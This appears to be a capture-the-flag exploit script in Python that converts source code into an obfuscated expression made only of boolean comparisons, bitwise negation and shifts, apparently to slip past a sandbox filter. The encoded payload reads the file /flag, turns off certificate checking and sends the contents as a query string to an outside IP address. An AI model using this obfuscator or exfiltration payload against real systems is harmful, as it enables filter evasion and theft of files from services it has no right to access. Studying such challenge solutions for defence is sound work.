def getNumber3(number):
    number = int(number)
    if number in [-2, -1, 0, 1]:
        return ["~int(True)", "~int(False)",
                "int(False)", "int(True)"][number + 2]

    if number % 2:
        return "~%s" % getNumber3(~number)
    else:
        return "(%s<<(int(True)))" % getNumber3(number / 2)


def getNumber2(number):
    number = int(number)
    if number in [-2, -1, 0, 1]:
        return ["~([]<())", "~([]<[])",
                "([]<[])", "([]<())"][number + 2]

    if number % 2:
        return "~%s" % getNumber2(~number)
    else:
        return "(%s<<([]<()))" % getNumber2(number / 2)

s = 'import urllib.request;import ssl;f=open("/flag").read(100);context = ssl._create_unverified_context();url = "http://42.192.137.212?1="+f;request = urllib.request.Request(url);response = urllib.request.urlopen(url=request,context=context)'
# s = '123'
res = 'str().join(['
for i in s:
    res += f"chr({getNumber3(ord(i))}),"
res = res[:-1]
res += '])'
print(res)


